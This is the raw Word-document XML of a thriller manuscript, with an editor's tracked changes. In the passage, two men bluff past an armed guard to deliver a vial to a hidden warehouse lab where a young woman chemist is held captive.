        <w:t>. “Eugene’ll be alright. Sergey’s got someone patching him up. But we barely got out alive.”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 the fuck are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call me Numbers,” Jason told him steadily. “And that’s Diggitty in the car. Listen, would you mind putting the piece down? I’ve already been shot at enough tonight. Look at my ride, man. I’ve had to drive around in that thing all night.”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guard kept the firearm aimed squarely at Jason, but after a glance at the car, his stance relaxed. “Why are you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 have the vial.” Moving very slowly, he withdrew the small tube from his pocket. “The girl will know what to do with it. Is she alright?”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guard lowered the gun. “She’s been crashing for like a week straight. But she’s fine.”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“Who’s watching her?”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“Just Rex,” replied the guard. “Look, I gotta call the boss-man about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“Haven’t you been seeing the emails?” Jason said. “He burned his phone and called lockdown. No cellphone</w:t>
      </w:r>
      <w:ins w:id="2038" w:author="TextVet" w:date="2016-03-22T09:23:00Z">
        <w:r w:rsidR="00E11B9F">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 xml:space="preserve"> or email</w:t>
      </w:r>
      <w:ins w:id="2039" w:author="TextVet" w:date="2016-03-22T09:23:00Z">
        <w:r w:rsidR="00E11B9F">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 He says the feds are monitoring our communications.”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guard said nothing, weighing his options.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“Look, no offense, man, but we got to get this thing in there stat,” said Jason. “It’s supposed to be in deep-freeze.”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guard paused. Grudgingly, he said, “Alright. Go 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proceeded toward the metal stairs behind the guard.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hopped out of the Navigator. He pulled out his HERF gun and hurried to catch up toward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“Whoa whoawhoa!” barked the guard. “Just what the hell is that?” The dreadlocked man’s fierce eyes </w:t>
      </w:r>
      <w:r w:rsidR="00F77652">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dagger</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ed </w:t>
      </w:r>
      <w:r w:rsidR="00F77652">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>at</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">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froze. He stood facing the guard, carrying the HERF gun slung over one shoulder, still wearing Natalie’s oversized floral-print sweatshirt.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 um… bio… interferometric… decalibrator… for asymptotic percolation of…” he began to squeak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cut him off. “Please cut Diggitty some slack. He’s a little… slow, if you know what I mean. Actually, slow’s not right. He’s great with machines and computers, but you make him talk to a human being and he practically pisses his pants.”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tried to say something. His feelings </w:t>
      </w:r>
      <w:ins w:id="2040" w:author="TextVet" w:date="2016-03-22T09:29:00Z">
        <w:r w:rsidR="001D1B05">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>demanded that he</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2041" w:author="TextVet" w:date="2016-03-22T09:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001D1B05">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>told him to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> protest</w:t>
      </w:r>
      <w:ins w:id="2042" w:author="TextVet" w:date="2016-03-22T09:30:00Z">
        <w:r w:rsidR="00FF1240">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but his brain </w:t>
      </w:r>
      <w:ins w:id="2043" w:author="TextVet" w:date="2016-03-22T09:29:00Z">
        <w:r w:rsidR="001D1B05">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>implore</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2044" w:author="TextVet" w:date="2016-03-22T09:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001D1B05">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>tol</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d him to play into Jason’s improv role. He ended up just opening and closing his mouth a few times, which coincidentally made a believable display of mental deficiency.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guard looked Danny up and down, and his hostile expression faded. “This one buddy of mine back in school, he had a kid brother like that. Autistic,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said Jason. “Asperger’s, actually, but close. Poor guy.”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“Dude would have to have something wrong with his brain to wear a shirt like that,” he said, and smiled condescendingly. “What’s that you got for us, Diggitty? Is that equipment for the lab?” the guard asked in a tone normally reserved for pets and small children.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fearfully. Despite being a few inches taller than the guard, he felt like a tiny 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waved him through. “Alright, go do your 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walked sheepishly past him to join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black metal stairs ran straight along the outside of the building’s brick face. Underneath the staircase</w:t>
      </w:r>
      <w:ins w:id="2045" w:author="TextVet" w:date="2016-03-22T09:35:00Z">
        <w:r w:rsidR="00B662A4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2046" w:author="TextVet" w:date="2016-03-22T09:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B662A4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> was</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a set of large heavy double doors</w:t>
      </w:r>
      <w:ins w:id="2047" w:author="TextVet" w:date="2016-03-22T09:35:00Z">
        <w:r w:rsidR="00B662A4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> portended</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2048" w:author="TextVet" w:date="2016-03-22T09:36:00Z">
        <w:r w:rsidR="00B662A4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2049" w:author="TextVet" w:date="2016-03-22T09:41:00Z">
        <w:r w:rsidR="00A477FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>draconianism</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. The stairs topped off at a corrugated landing, where a single reinforced metal door with several keyholes awaited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Jason ascended the long stairs and knocked. Locks clicked open, and the door swung inward.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 the hell are you?” cam</w:t>
      </w:r>
      <w:r w:rsidR="001B75C4">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>croaking</w:t>
      </w:r>
      <w:r w:rsidR="001B75C4">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> grizzled male voice from inside.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door opened to a dim office room, illuminated solely by a monitor</w:t>
      </w:r>
      <w:r w:rsidR="00750A23">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> dominated by a desk</w:t>
      </w:r>
      <w:r w:rsidR="00750A23">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:del w:id="2050" w:author="TextVet" w:date="2016-03-22T09:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00750A23">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051" w:author="TextVet" w:date="2016-03-22T09:46:00Z">
        <w:r w:rsidR="00750A23">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">It was </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mostly empty save for the computer and some random papers. The wall along the desk was built of plate glass windows overlooking a large dark area. The adjacent wall abutted a tiny bathroom. Across from the entrance</w:t>
      </w:r>
      <w:r w:rsidR="006558BD">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a pale blue door</w:t>
      </w:r>
      <w:r w:rsidR="00750A23">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> warned that it was</w:t>
      </w:r>
      <w:del w:id="2052" w:author="TextVet" w:date="2016-03-22T09:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00750A23">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, apparently</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the only other way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“You’re Rex, right?” said Jason. “Sergey sent us. We’ve got stuff for the lab.”</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front of the computer, in a rickety wheelie-chair, sat a scrawny man with stringy blond hair, wearing cowboy boots and a denim jacket. He didn’t seem old, but his pale skin looked far too wrinkled and pocked for his age. On the desk next to him, beside a pair of earbud headphones connected to the computer, sat his firearm, the same kind of complex, blocky handgun. “Drop your shit off over there,” he said, absentmindedly gesturing to a corner of the desk. “I’ll take it downstairs in the morning.”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“Actually, Rex, this kind of needs the girl’s immediate attention,” Jason said. He showed him the vial.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Rex bolted forward excitedly.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not doing too good,” said Jason as he entered. Danny followed, closing the front door behind him. “It’s been out of a freezer for a couple hours now. She needs to look at it fast.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="008E239C" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:del w:id="2053" w:author="TextVet" w:date="2016-03-22T09:55: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“I’ll wake her up,” </w:t>
      </w:r>
      <w:r w:rsidR="007C38D2">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">agreed </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Rex.</w:t>
      </w:r>
      <w:ins w:id="2054" w:author="TextVet" w:date="2016-03-22T09:55:00Z">
        <w:r w:rsidR="008E239C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>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2055" w:author="TextVet" w:date="2016-03-22T09:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008E239C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Rex</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2056" w:author="TextVet" w:date="2016-03-22T09:55:00Z">
        <w:r w:rsidR="008E239C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>He</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> rolled </w:t>
      </w:r>
      <w:del w:id="2057" w:author="TextVet" w:date="2016-03-22T09:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008E239C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">in </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">his wheelie-chair to the far wall and flipped a </w:t>
      </w:r>
      <w:del w:id="2058" w:author="TextVet" w:date="2016-03-22T09:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0042127D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">light </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>switch. In the dark space beyond the wide windows, large gymnasium-style lighting fixtures hanging from the ceiling flickered to life.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illuminated a concrete floor twenty feet below, between walls of cinder</w:t>
      </w:r>
      <w:ins w:id="2059" w:author="TextVet" w:date="2016-03-22T09:57:00Z">
        <w:r w:rsidR="000473A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2060" w:author="TextVet" w:date="2016-03-22T09:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000473A9">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block and brick. The industrial space</w:t>
      </w:r>
      <w:ins w:id="2061" w:author="TextVet" w:date="2016-03-22T09:57:00Z">
        <w:r w:rsidR="000473A9">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big enough for a warehouse or machine shop, </w:t>
      </w:r>
      <w:del w:id="2062" w:author="TextVet" w:date="2016-03-22T09:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000473A9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">extended beneath the overhanging office. Packing peanuts and torn-open cardboard boxes lay strewn around the floor. Throughout the room was a widely spread, haphazardly arranged array of chemistry and biology equipment, including racks of </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>beakers and tubes, warning-labeled canisters of liquids, and machinery that looked like dishwashers, ovens, refrigerators, and water coolers.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blond man stomped loudly. The sharp pounding of his boot resounded through the industrial space.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“Rise and shine, princess!” he called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faint shuffling noise rose from somewhere beneath the floor. “Fuck off,” a young woman’s voice groaned from below.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“Move it, bitch! You know the drill,” he commanded. “Out where I can see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There was movement below. Out from the space underneath the office room emerged a young Asian woman. She was dressed in an ill-fitting </w:t>
      </w:r>
      <w:ins w:id="2063" w:author="TextVet" w:date="2016-03-22T09:59:00Z">
        <w:r w:rsidR="00907A8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2064" w:author="TextVet" w:date="2016-03-22T09:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00907A8D">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-shirt, sweatpants, and bunny slippers. She had a bruised lip, but otherwise seemed unhurt. She walked to a corner of the factory clearly visible from the open windows of the office above.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“Good girl! Stay!” Rex shouted down to her. He put his earbuds back in,</w:t>
      </w:r>
      <w:del w:id="2065" w:author="TextVet" w:date="2016-03-22T10:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C0619">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mutter</w:t>
      </w:r>
      <w:ins w:id="2066" w:author="TextVet" w:date="2016-03-22T10:00:00Z">
        <w:r w:rsidR="008C0619">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2067" w:author="TextVet" w:date="2016-03-22T10:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C0619">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“She’s all yours,” before resuming the video on his computer.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Jason opened the door on the other side of the room, revealing an interior stairwell. Danny followed </w:t>
      </w:r>
      <w:ins w:id="2068" w:author="TextVet" w:date="2016-03-22T10:06:00Z">
        <w:r w:rsidR="00CE43FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>him</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2069" w:author="TextVet" w:date="2016-03-22T10:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE43FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Jason</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> down to the factory floor</w:t>
      </w:r>
      <w:del w:id="2070" w:author="TextVet" w:date="2016-03-22T10:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E325B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> below</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>17</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“Asperger’s?” Danny muttered </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>as they stepped down the interior stairs. “You told the guy I had Asperger’s?”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shrugged. “The best lies are based on truth.”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two of them kicked away bits of packing litter as they walked past fluid-filled vats and racks of glassware. Behind them, 55-gallon drums marked “Kerosene” and “Acetone” sat stacked against the rear wall.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Yen stood beside a naked mattress strewn with ragged blankets. She greeted them with a scowl.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said Jason quietly as he approached. “Relax. We’re friends. Everything will be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“Right,” she scoffed.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gave her a cursory glance, then shifted his attention back to the equipment surrounding him. On a metal table s</w:t>
      </w:r>
      <w:del w:id="2071" w:author="TextVet" w:date="2016-03-22T10:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A80EDF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:ins w:id="2072" w:author="TextVet" w:date="2016-03-22T10:10:00Z">
        <w:r w:rsidR="00A80EDF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ood</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> an unmarked</w:t>
      </w:r>
      <w:ins w:id="2073" w:author="TextVet" w:date="2016-03-22T10:08:00Z">
        <w:r w:rsidR="00A72645">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, seal-stoppered</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
